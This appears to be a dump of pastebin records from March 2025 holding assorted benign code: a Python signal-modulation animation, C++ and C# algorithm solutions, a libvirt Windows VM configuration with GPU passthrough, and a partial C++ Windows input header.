

    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
4hP68Rii,Keys,Kingjoya907,HTML,Friday 28th of March 2025 02:11:30 PM CDT,1031290A31210312-JOYA-81229171NAJNOMFREP0911SMPP
dhYcb7j2,Задача №1. Сигналы.,Korotkodul,Python,Friday 28th of March 2025 01:50:28 PM CDT,"from functools import partial

import matplotlib.pyplot as plt
import numpy as np

from IPython.display import HTML
from matplotlib.animation import FuncAnimation
plt.style.use(""ggplot"")


def put_labels(axis):
    axis.set_title(""Анимация модулированного сигнала"",
                   fontsize=16,
                   fontweight=""bold"",
                   c=""black"")

    axis.set_ylabel(""Амплитуда"",
                    fontsize=13,
                    fontweight=""bold"",
                    c=""dimgray"")

    axis.set_xlabel(""Время (секунды)"",
                    fontsize=13,
                    fontweight=""bold"",
                    c=""dimgray""
                    )

    plt.legend(handles=[plt.Line2D([0], [0], color='red', label='Сигнал')],
               bbox_to_anchor=(1, 1), loc=""upper right"")


def create_ordinates(abscissa, modulation, fc, frame_id):
    if not modulation:
        ordinates = np.sin(2 * np.pi * (abscissa + frame_id * animation_step) * fc)
    else:
        ordinates = modulation(abscissa + frame_id * animation_step) * np.sin(
              2 * np.pi * (abscissa + frame_id * animation_step) * fc)
    return ordinates


def save_file(path, animation):
    if path == """":
        pass
    else:
        animation.save(path, writer=""pillow"", fps=30)


def create_modulation_animation(
    modulation, 
    fc, 
    num_frames, 
    plot_duration, 
    time_step=0.001, 
    animation_step=0.01,
    save_path=""""
) -> FuncAnimation:

    def update_frame(
        frame_id: int,
        *,
        line: plt.Line2D,
        abscissa: np.ndarray,
    ) -> tuple[plt.Line2D]:
        ordinates = create_ordinates(abscissa, modulation, fc, frame_id)
        line.set_data(abscissa + frame_id * animation_step, ordinates)
        axis.set_xlim((abscissa + frame_id * animation_step)[0], (abscissa + frame_id * animation_step)[-1])
        return line,

    abscissa = np.arange(0, plot_duration, time_step)
    figure, axis = plt.subplots(figsize=(16, 9))
    axis: plt.Axes
    put_labels(axis)
    axis.set_xlim(abscissa.min(), abscissa.max())
    line, *_ = axis.plot(
        abscissa,
        create_ordinates(abscissa, modulation, fc, 0),
        c=""red"",
    )

    animation = FuncAnimation(
        figure,
        partial(update_frame, line=line, abscissa=abscissa),
        frames=num_frames,
        interval=50,
        blit=True,
    )

    save_file(save_path, animation)

    return animation


def modulation_function(t):
    return np.sin(t) 


num_frames = 100  
plot_duration = np.pi / 2 
time_step = 0.001  
animation_step = np.pi / 200 
fc = 50 
save_path_with_modulation = ""modulated_signal.gif""

animation = create_modulation_animation(
    modulation=modulation_function,
    fc=fc,
    num_frames=num_frames,
    plot_duration=plot_duration,
    time_step=time_step,
    animation_step=animation_step,
    save_path=save_path_with_modulation
)
HTML(animation.to_jshtml())
"
bTTEZiMy,数字串个数 参考代码,Dmaxiya,C++,Friday 28th of March 2025 01:15:35 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 10000 + 100;
const LL MOD = 1000000007;
LL dp[maxn][4];

LL fastPow(LL res, LL n) {
    LL ans;
    for (ans = 1; n != 0; n >>= 1) {
        if ((n & 1) == 1) {
            ans = ans * res % MOD;
        }
        res = res * res % MOD;
    }
    return ans;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    dp[0][0] = 1;
    for (int i = 1; i <= 10000; ++i) {
        dp[i][0] = dp[i - 1][0] * 7 % MOD;
        dp[i][1] = (dp[i - 1][0] * 1 + dp[i - 1][1] * 8 % MOD) % MOD;
        dp[i][2] = (dp[i - 1][0] + dp[i - 1][2] * 8 % MOD) % MOD;
        dp[i][3] = (dp[i - 1][1] + dp[i - 1][2] + dp[i - 1][3] * 9) % MOD;
    }
    cout << dp[10000][3] << endl;

    cout << ((fastPow(9, 10000) - 2 * fastPow(8, 10000) + fastPow(7, 10000)) % MOD + MOD) % MOD << endl;

    return 0;
}"
00fQP7qm,NeetCode.FindAllPossibleRecipesFromGiveSupplies,ivandrofly,C#,Friday 28th of March 2025 01:13:15 PM CDT,"// types of arrays

int[,] array2D = new[,]
{
    { 1, 1 }, { 1, 1 }
};
int[][] jagged = new int[][]
{
    [1, 1],
    [1, 1],
    [1, 1]
};

// string[,] ingredients = [[""yeast"", ""flour""], [""bread"", ""meat""], [""sandwich"", ""meat"", ""bread""]];

string[] recipes = [""bread"", ""sandwich"", ""meat""];
string[][] ingredients = new string[][] { [""yeast"", ""flour""], [""bread"", ""meat""], [""sandwich"", ""meat"", ""bread""] };
string[] supplies = [""yeast"", ""flour"", ""meat""];

Console.WriteLine(String.Join("","", FindAllRecipes(recipes, ingredients, supplies)));
return;

static IEnumerable<string> FindAllRecipes(string[] recipes, string[][] ingredients, string[] supplies)
{
    // all supplies are marked as cookable
    var canCook = supplies.ToDictionary(s => s, _ => true);
    var recipeIndex = recipes.Zip(Enumerable.Range(0, recipes.Length),
        (r, i) => (r, i)).ToDictionary(zip => zip.r, zip => zip.i);

    List<string> result = [];

    foreach (string recipe in recipes)
    {
        if (Dfs(recipe))
        {
            result.Add(recipe);
        }
    }

    return result;

    bool Dfs(string recipe)
    {
        if (canCook.TryGetValue(recipe, out _))
        {
            return canCook[recipe];
        }

        canCook[recipe] = false; // handles circular dependencies

        if (!recipeIndex.ContainsKey(recipe))
        {
            return false;
        }

        foreach (string ingredient in ingredients[recipeIndex[recipe]])
        {
            if (!canCook.TryGetValue(ingredient, out _))
            {
                return false;
            }
        }

        canCook[recipe] = true;

        return canCook[recipe];
    }
}

// output:
// [""bread"", ""sandwich"", ""burger""]

// INFORMATION:
// Find All Possible Recipes from Given Supplies - Leetcode 2115 - Python
// https://youtu.be/AQrsAc3EcyQ"
uzdM6pMT,windows11-ryzen5800x-libvirt-xml-16,mmcze,XML,Friday 28th of March 2025 12:39:38 PM CDT,"<domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
  <name>windows2</name>
  <uuid>3ca72322-a343-32ff-ab2d-119eb4b63e34</uuid>
  <memory unit='KiB'>50331648</memory>
  <currentMemory unit='KiB'>50331648</currentMemory>
  <memoryBacking>
    <hugepages/>
    <nosharepages/>
    <locked/>
  </memoryBacking>
  <vcpu placement='static'>14</vcpu>
  <iothreads>1</iothreads>
  <cputune>
    <vcpupin vcpu='0' cpuset='15'/>
    <vcpupin vcpu='1' cpuset='7'/>
    <vcpupin vcpu='2' cpuset='14'/>
    <vcpupin vcpu='3' cpuset='6'/>
    <vcpupin vcpu='4' cpuset='13'/>
    <vcpupin vcpu='5' cpuset='5'/>
    <vcpupin vcpu='6' cpuset='12'/>
    <vcpupin vcpu='7' cpuset='4'/>
    <vcpupin vcpu='8' cpuset='11'/>
    <vcpupin vcpu='9' cpuset='3'/>
    <vcpupin vcpu='10' cpuset='10'/>
    <vcpupin vcpu='11' cpuset='2'/>
    <vcpupin vcpu='12' cpuset='9'/>
    <vcpupin vcpu='13' cpuset='1'/>
    <emulatorpin cpuset='8'/>
    <iothreadpin iothread='1' cpuset='0'/>
    <emulatorsched scheduler='fifo' priority='10'/>
  </cputune>
  <resource>
    <partition>/machine</partition>
  </resource>
  <os>
    <type arch='x86_64' machine='pc-q35-9.0'>hvm</type>
    <loader readonly='yes' secure='yes' type='pflash'>/usr/share/OVMF/OVMF_CODE_4M.secboot.fd</loader>
    <nvram>/usr/share/OVMF/OVMF_VARS_4M.ms.fd</nvram>
    <bootmenu enable='no'/>
    <smbios mode='host'/>
  </os>
  <features>
    <acpi/>
    <apic eoi='on'/>
    <hap state='on'/>
    <hyperv mode='custom'>
      <relaxed state='on'/>
      <vapic state='on'/>
      <spinlocks state='on' retries='8191'/>
      <vpindex state='on'/>
      <runtime state='on'/>
      <synic state='on'/>
      <stimer state='on'>
        <direct state='on'/>
      </stimer>
      <reset state='on'/>
      <vendor_id state='on' value='1234567890ab'/>
      <frequencies state='on'/>
      <reenlightenment state='on'/>
      <tlbflush state='on'/>
      <ipi state='on'/>
      <avic state='on'/>
    </hyperv>
    <kvm>
      <hidden state='on'/>
      <hint-dedicated state='on'/>
      <poll-control state='on'/>
      <pv-ipi state='on'/>
    </kvm>
    <pmu state='off'/>
    <vmport state='off'/>
    <smm state='on'>
      <tseg unit='MiB'>64</tseg>
    </smm>
    <ioapic driver='kvm'/>
  </features>
  <cpu mode='host-passthrough' check='full' migratable='off'>
    <topology sockets='1' dies='1' cores='7' threads='2'/>
    <cache mode='passthrough'/>
    <feature policy='disable' name='x2apic'/>
    <feature policy='require' name='tsc-deadline'/>
    <feature policy='require' name='tsc_adjust'/>
    <feature policy='require' name='arch-capabilities'/>
    <feature policy='require' name='rdctl-no'/>
    <feature policy='require' name='skip-l1dfl-vmentry'/>
    <feature policy='require' name='mds-no'/>
    <feature policy='require' name='pschange-mc-no'/>
    <feature policy='require' name='topoext'/>
    <feature policy='disable' name='svm'/>
    <feature policy='require' name='hypervisor'/>
    <feature policy='require' name='invtsc'/>
    <feature policy='require' name='ibpb'/>
    <feature policy='require' name='virt-ssbd'/>
    <feature policy='require' name='pdpe1gb'/>
    <feature policy='require' name='cmp_legacy'/>
    <feature policy='require' name='xsaves'/>
    <feature policy='require' name='perfctr_core'/>
    <feature policy='require' name='clzero'/>
    <feature policy='require' name='xsaveerptr'/>
  </cpu>
  <clock offset='timezone' timezone='Europe/Prague'>
    <timer name='rtc' present='no' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='discard'/>
    <timer name='hpet' present='no'/>
    <timer name='kvmclock' present='no'/>
    <timer name='hypervclock' present='yes'/>
    <timer name='tsc' present='yes' mode='native'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>destroy</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/usr/bin/qemu-system-x86_64</emulator>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/crypt/win2-storage/disk.raw'/>
      <backingStore/>
      <target dev='vda' bus='scsi'/>
      <boot order='1'/>
      <address type='drive' controller='0' bus='0' target='0' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/zrcadlo2/win2-storage2/disk.raw'/>
      <backingStore/>
      <target dev='vdb' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='1' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool1/win2-storage3/disk.raw'/>
      <backingStore/>
      <target dev='vdc' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='2' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool2/win2-storage4/disk.raw'/>
      <backingStore/>
      <target dev='vdd' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='3' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <controller type='pci' index='0' model='pcie-root'/>
    <controller type='pci' index='1' model='dmi-to-pci-bridge'>
      <model name='i82801b11-bridge'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pci-bridge'>
      <model name='pci-bridge'/>
      <target chassisNr='2'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x10'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x11'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x12'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x13'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='8' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='8' port='0x9'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x1'/>
    </controller>
    <controller type='scsi' index='0' model='virtio-scsi'>
      <driver queues='8' iothread='1'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x2'/>
    </controller>
    <controller type='sata' index='0'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='usb' index='0' model='nec-xhci' ports='6'>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </controller>
    <interface type='bridge'>
      <mac address='52:54:00:46:db:27'/>
      <source bridge='br0'/>
      <model type='virtio'/>
      <driver queues='8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0'/>
    </interface>
    <input type='mouse' bus='ps2'/>
    <input type='keyboard' bus='ps2'/>
    <tpm model='tpm-tis'>
      <backend type='emulator' version='2.0'/>
    </tpm>
    <audio id='1' type='none'/>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x0'/>
      </source>
      <rom file='/usr/share/ovmf/rx7900xt.rom'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0' multifunction='on'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x1'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x2'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x2'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x3'/>
    </hostdev>
    <hostdev mode='subsystem' type='usb' managed='yes'>
      <source>
        <vendor id='0x0458'/>
        <product id='0x6007'/>
        <address bus='3' device='2'/>
      </source>
      <address type='usb' bus='0' port='3'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x2b' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </hostdev>
    <watchdog model='itco' action='reset'/>
    <memballoon model='none'/>
  </devices>
  <seclabel type='dynamic' model='dac' relabel='yes'/>
<qemu:commandline>
<qemu:arg value=""-fw_cfg""/>
<qemu:arg value=""opt/ovmf/X-PciMmio64Mb,string=65536""/>
</qemu:commandline>
</domain>"
mY7tPJAx,work for 2025-03-28 (2/2),Kitomas,C++,Friday 28th of March 2025 11:52:08 AM CDT,"/******************************************************************************/
/******************************************************************************/
//""gdi_winmm_2025-03-28\include\public_stuff.hpp"":
#ifndef _PUBLIC_STUFF_HPP
#define _PUBLIC_STUFF_HPP

#include <stdio.h>

// If you don't end up using anything else from stdio,
// using this makes sure the function is only included in the debug build!
#ifdef _DEBUG
  #define _printf(...) printf(__VA_ARGS__)
#else
  #define _printf(...)
#endif /* _DEBUG */



#ifndef   M_PI4f
#define   M_PI4f 0.7853981633974483096156608f
#endif /* M_PI2 */

#ifndef   M_PI2f
#define   M_PI2f 1.5707963267948966192313216f
#endif /* M_PI2 */

#ifndef   M_PIf
#define   M_PIf  3.1415926535897932384626433f
#endif /* M_PIf */

#ifndef   M_2PIf
#define   M_2PIf 6.2831853071795864769252866f
#endif /* M_2PIf */

#define MIN(a,b) ( ((a)<(b)) ? (a) : (b) )
#define MAX(a,b) ( ((a)<(b)) ? (b) : (a) )
#define CLAMP(v, mn, mx) MIN(MAX(v, mn), mx)



#ifdef __cplusplus
  #include <cstddef>
  #include <cstdint>
#else
  #include <stdint.h>
#endif /* __cplusplus */

typedef uint8_t  u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t  s8;
typedef int16_t s16;
typedef int32_t s32;
typedef int64_t s64;

typedef float  f32;
typedef double f64;





/************************************ MISC ************************************/

struct Fpoint2d { f32 x, y; };
struct Point2d  { s32 x, y; };
struct Rect2d   { s32 x, y, w, h; };



// ""std.cpp"":

void* memSet(void* dst, int val, size_t len);

//(len_max does not include null-terminator!)
//(if !len_max, call is analogous to str(not n)len)
size_t strnLen(const char* str, size_t len_max);

char* strnCpy(char* str_dst, const char* str_src, size_t len_max);

char* strCat(char* dst, const char* src);

//(len_max does not include null-terminator!)
//(if !len_max, call is analogous to str(not n)cmp)
s32 strnCmp(const char* str_a, const char* str_b, size_t len_max);

f32 sinF(f32 x);
#define cosF(_x) sinF((_x)+M_PI2f)
#define tanF(_x) ( sinF(_x)/cosF(_x) )



#if defined(_INC_STRING) || defined(_GLIBCXX_CSTRING)
  #define memSet  memset
  #define strnLen strnlen
  #define strnCpy strncpy
  #define strCat  strcat
  #define strnCmp strncmp
#endif

#if defined(_MATH_H_) || defined(_GLIBCXX_CMATH)
  #define sinF sinf
#endif

#if !defined(_INC_STDLIB) && !defined(_GLIBCXX_CSTDLIB) && !defined(_GLIBCXX_STDLIB_H)
  #include <win32/misc.hpp>
  #define malloc  CoTaskMemAlloc
  #define realloc CoTaskMemRealloc
  #define free    CoTaskMemFree
#endif



// ""misc.cpp"":

enum MessageBoxEnum {
  // Return values
  MSGBOX_RTN_NULL     = 0x00000000, //showMessageBox failed
  MSGBOX_RTN_OK       = 0x00000001, //'ok' button was clicked
  MSGBOX_RTN_CANCEL   = 0x00000002, //'cancel' button was clicked
  MSGBOX_RTN_ABORT    = 0x00000003, //'abort' button was clicked
  MSGBOX_RTN_RETRY    = 0x00000004, //'retry' button was clicked
  MSGBOX_RTN_IGNORE   = 0x00000005, //'ignore' button was clicked
  MSGBOX_RTN_YES      = 0x00000006, //'yes' button was clicked
  MSGBOX_RTN_NO       = 0x00000007, //'no' button was clicked
  MSGBOX_RTN_TRYAGAIN = 0x0000000A, //'try again' button was clicked
  MSGBOX_RTN_CONTINUE = 0x0000000B, //'continue' button was clicked

  // Button types
  MSGBOX_BTN_OK                = 0x00000000,
  MSGBOX_BTN_OKCANCEL          = 0x00000001,
  MSGBOX_BTN_ABORTRETRYIGNORE  = 0x00000002,
  MSGBOX_BTN_YESNOCANCEL       = 0x00000003,
  MSGBOX_BTN_YESNO             = 0x00000004,
  MSGBOX_BTN_RETRYCANCEL       = 0x00000005,
  MSGBOX_BTN_CANCELTRYCONTINUE = 0x00000006,

  // Icon types
  MSGBOX_ICN_ERROR    = 0x000000010,
  MSGBOX_ICN_QUESTION = 0x000000020, //apparently deprecated, but still supported
  MSGBOX_ICN_WARNING  = 0x000000030,
  MSGBOX_ICN_INFO     = 0x000000040,

};

u32 showMessageBox(const char* text = nullptr, const char* title = nullptr,
                   u32 type = 0, u32 defaultButton = 0);

u64 timeGetPerfCounter();
u64 timeGetPerfFreq();
f64 timeGetSeconds();

void timeSleep(u32 milliseconds);





/*********************************** INPUT ************************************/

#define EVENT_ID(_id) ( (_id) & 0xFFFF0000 )
#define SUBEVENT_ID(_id) ( (_id) & 0xFFFF )

enum EventEnum {
  EVENT_NULL           = 0x00000000,

  EVENT_COMMON         = 0x00010000, // Event_Common (Event.common)

  // (Occurs when the window is destroyed!)
  EVENT_QUIT           = 0x00020000, // N/A (N/A)

  EVENT_KEY            = 0x00030000, // Event_Key (Event.key)
  EVENT_KEY_CHAR       = EVENT_KEY   | 0x0001,
  EVENT_KEY_UP         = EVENT_KEY   | 0x0002,
  EVENT_KEY_DOWN       = EVENT_KEY   | 0x0003,

  EVENT_MOUSE          = 0x00040000, // Event_Mouse (Event.mouse)
  EVENT_MOUSE_MOVED    = EVENT_MOUSE | 0x0001,
  EVENT_MOUSE_HWHEEL   = EVENT_MOUSE | 0x0002,
  EVENT_MOUSE_VWHEEL   = EVENT_MOUSE | 0x0003,
  EVENT_MOUSE_UP       = EVENT_MOUSE | 0x0004,
  EVENT_MOUSE_DOWN     = EVENT_MOUSE | 0x0005,

};



/*+EVENT_COMMON+*/

struct Event_Common { //16B
  u32  type;
  u32 _unused; // Unused by common, but not necessarily other event types
  u64  timestamp; // Performance counter is used; see ""timeGetPerfCounter()""
};

/*-EVENT_COMMON-*/



/*+EVENT_KEY+*/

// Event_Key.kmods can use any combination of these OR'd (AKA |) together
enum Event_Key_ModifierEnum { // (These are bitmasks)
  KMOD_NONE      = 0x0000,
  KMOD_LSHIFT    = 0x0001,
  KMOD_RSHIFT    = 0x0002,
  KMOD_LCTRL     = 0x0004,
  KMOD_RCTRL     = 0x0008,
  KMOD_LALT      = 0x0010,
  KMOD_RALT      = 0x0020,
  KMOD_LGUI      = 0x0040, // Windows key?
  KMOD_RGUI      = 0x0080,  //^^
    KMOD_LWIN    = KMOD_LGUI,
    KMOD_RWIN    = KMOD_RGUI,
  KMOD_NUMLOCK   = 0x1000,
  KMOD_CAPSLOCK  = 0x2000,
  KMOD_ALTGRAPH  = 0x4000,
  KMOD_SCROLLOCK = 0x8000,
  KMOD_CTRL      = ( KMOD_LCTRL  | KMOD_RCTRL  ),
  KMOD_SHIFT     = ( KMOD_LSHIFT | KMOD_RSHIFT ),
  KMOD_ALT       = ( KMOD_LALT   | KMOD_RALT   ),
  KMOD_GUI       = ( KMOD_LGUI   | KMOD_RGUI   ),
  KMOD_WIN       = ( KMOD_LWIN   | KMOD_RWIN   ),
};



enum Event_Key_PhysicalEnum {
  // TBD because I don't want to bother with scancode stuff right now
};



enum Event_Key_VirtualEnum {
  //(misc. mouse)       = 0x01 -> 0x06
  //(reserved)          = 0x07,
  VKEY_BACK             = 0x08, //backspace key
    VKEY_BACKSPACE      = VKEY_BACK,
  VKEY_TAB              = 0x09,
  //(reserved)          = 0x0A -> 0x0B,
  VKEY_CLEAR            = 0x0C,
  VKEY_RETURN           = 0x0D, //enter key
    VKEY_ENTER          = VKEY_RETURN,
  //(unassigned)        = 0x0E -> 0x0F,
  VKEY_SHIFT            = 0x10,
  VKEY_CONTROL          = 0x11, //ctrl key
    VKEY_CTRL           = VKEY_CONTROL,
  VKEY_MENU             = 0x12, //alt key
    VKEY_ALT            = VKEY_MENU,
  VKEY_PAUSE            = 0x13,
  VKEY_CAPITAL          = 0x14, //caps lock key
    VKEY_CAPSLOCK       = VKEY_CAPITAL,
  //(IME stuff)         = 0x15 -> 0x1A,
  VKEY_ESCAPE           = 0x1B, //esc key
  //(IME stuff)         = 0x1C -> 0x1F,
  VKEY_SPACE            = 0x20, //space bar key
  VKEY_PRIOR            = 0x21, //page up key
    VKEY_PGUP           = VKEY_PRIOR,
  VKEY_NEXT             = 0x22, //page down key
    VKEY_PGDN           = VKEY_NEXT,
  VKEY_END              = 0x23,
  VKEY_HOME             = 0x24,
  VKEY_LEFT             = 0x25, //left arrow key
  VKEY_UP               = 0x26, //up arrow key
  VKEY_RIGHT            = 0x27, //right arrow key
  VKEY_DOWN             = 0x28, //down arrow key
  VKEY_SELECT           = 0x29,
  VKEY_PRINT            = 0x2A,
  VKEY_EXECUTE          = 0x2B,
  VKEY_SNAPSHOT         = 0x2C, //print screen key
    VKEY_PRTSC          = VKEY_SNAPSHOT,
  VKEY_INSERT           = 0x2D, //ins key
  VKEY_DELETE           = 0x2E, //del key
  VKEY_HELP             = 0x2F, //help key
  VKEY_0                = 0x30, //'0'
  VKEY_1                = 0x31, //'1'
  VKEY_2                = 0x32, //'2'
  VKEY_3                = 0x33, //'3'
  VKEY_4                = 0x34, //'4'
  VKEY_5                = 0x35, //'5'
  VKEY_6                = 0x36, //'6'
  VKEY_7                = 0x37, //'7'
  VKEY_8                = 0x38, //'8'
  VKEY_9                = 0x39, //'9'
  //(undefined)         = 0x3A -> 0x40,
  VKEY_A                = 0x41, //'A'
  VKEY_B                = 0x42, //'B'
  VKEY_C                = 0x43, //'C'
  VKEY_D                = 0x44, //'D'
  VKEY_E                = 0x45, //'E'
  VKEY_F                = 0x46, //'F'
  VKEY_G                = 0x47, //'G'
  VKEY_H                = 0x48, //'H'
  VKEY_I                = 0x49, //'I'
  VKEY_J                = 0x4A, //'J'
  VKEY_K                = 0x4B, //'K'
  VKEY_L                = 0x4C, //'L'
  VKEY_M                = 0x4D, //'M'
  VKEY_N                = 0x4E, //'N'
  VKEY_O                = 0x4F, //'O'
  VKEY_P                = 0x50, //'P'
  VKEY_Q                = 0x51, //'Q'
  VKEY_R                = 0x52, //'R'
  VKEY_S                = 0x53, //'S'
  VKEY_T                = 0x54, //'T'
  VKEY_U                = 0x55, //'U'
  VKEY_V                = 0x56, //'V'
  VKEY_W                = 0x57, //'W'
  VKEY_X                = 0x58, //'X'
  VKEY_Y                = 0x59, //'Y'
  VKEY_Z                = 0x5A, //'Z'
  VKEY_LWIN             = 0x5B, //left windows key
  VKEY_RWIN             = 0x5C, //right windows key
  VKEY_APPS             = 0x5D, //applications key
  //(reserved)          = 0x5E,
  VKEY_SLEEP            = 0x5F, //computer sleep key
  VKEY_NUMPAD0          = 0x60,
  VKEY_NUMPAD1          = 0x61,
  VKEY_NUMPAD2          = 0x62,
  VKEY_NUMPAD3          = 0x63,
  VKEY_NUMPAD4          = 0x64,
  VKEY_NUMPAD5          = 0x65,
  VKEY_NUMPAD6          = 0x66,
  VKEY_NUMPAD7          = 0x67,
  VKEY_NUMPAD8          = 0x68,
  VKEY_NUMPAD9          = 0x69,
  VKEY_MULTIPLY         = 0x6A, //numpad '*'
  VKEY_ADD              = 0x6B, //numpad '+'
  VKEY_SEPARATOR        = 0x6C, //numpad enter
  VKEY_SUBTRACT         = 0x6D, //numpad '-'
  VKEY_DECIMAL          = 0x6E, //numpad '.'
  VKEY_DIVIDE           = 0x6F, //numpad '/'
  VKEY_F1               = 0x70,
  VKEY_F2               = 0x71,
  VKEY_F3               = 0x72,
  VKEY_F4               = 0x73,
  VKEY_F5               = 0x74,
  VKEY_F6               = 0x75,
  VKEY_F7               = 0x76,
  VKEY_F8               = 0x77,
  VKEY_F9               = 0x78,
  VKEY_F10              = 0x79,
  VKEY_F11              = 0x7A,
  VKEY_F12              = 0x7B,
  VKEY_F13              = 0x7C,
  VKEY_F14              = 0x7D,
  VKEY_F15              = 0x7E,
  VKEY_F16              = 0x7F,
  VKEY_F17              = 0x80,
  VKEY_F18              = 0x81,
  VKEY_F19              = 0x82,
  VKEY_F20              = 0x83,
  VKEY_F21              = 0x84,
  VKEY_F22              = 0x85,
  VKEY_F23              = 0x86,
  VKEY_F24              = 0x87,
  //(reserved)          = 0x88 -> 0x8F,
  VKEY_NUMLOCK          = 0x90,
  VKEY_SCROLL           = 0x91, //scroll lock key
    VKEY_SCROLLOCK      = VKEY_SCROLL,
  //(OEM-specific)      = 0x92 -> 0x96,
  //(unassigned)        = 0x97 -> 0x9F,
  //(l/r key variants)  = 0xA0 -> 0xA5,
  //(browser keys)      = 0xA6 -> 0xAC,
  VKEY_VOLUME_MUTE      = 0xAD,
  VKEY_VOLUME_DOWN      = 0xAE,
  VKEY_VOLUME_UP        = 0xAF,
  VKEY_MEDIA_NEXT_TRACK = 0xB0,
  VKEY_MEDIA_PREV_TRACK = 0xB1,
  VKEY_MEDIA_STOP       = 0xB2,
  VKEY_MEDIA_PLAY_PAUSE = 0xB3, //Play/Pause Media key
  //(launch keys)       = 0xB4 -> 0xB7,
  //(reserved)          = 0xB8 -> 0xB9,
  VKEY_OEM_1            = 0xBA, //misc. chars; varies by keyboard (';',':' on US standard)
    VKEY_SEMICOLON      = VKEY_OEM_1,
  VKEY_OEM_PLUS         = 0xBB, //'+' in any country/region
    VKEY_PLUS           = VKEY_OEM_PLUS,
  VKEY_OEM_COMMA        = 0xBC, //',' in any country/region
    VKEY_COMMA          = VKEY_OEM_COMMA,
  VKEY_OEM_MINUS        = 0xBD, //'-' in any country/region
    VKEY_MINUS          = VKEY_OEM_MINUS,
  VKEY_OEM_PERIOD       = 0xBE, //'.' in any country/region
    VKEY_PERIOD         = VKEY_OEM_PERIOD,
  VKEY_OEM_2            = 0xBF, //misc. chars; varies by keyboard ('/','?' on US standard)
    VKEY_FSLASH         = VKEY_OEM_2,
  VKEY_OEM_3            = 0xC0, //misc. chars; varies by keyboard ('`','~' on US standard)
    VKEY_BACKTICK       = VKEY_OEM_3,
  //(reserved)          = 0xC1 -> 0xDA,
  VKEY_OEM_4            = 0xDB, //misc. chars; varies by keyboard ('[','{' on US standard)
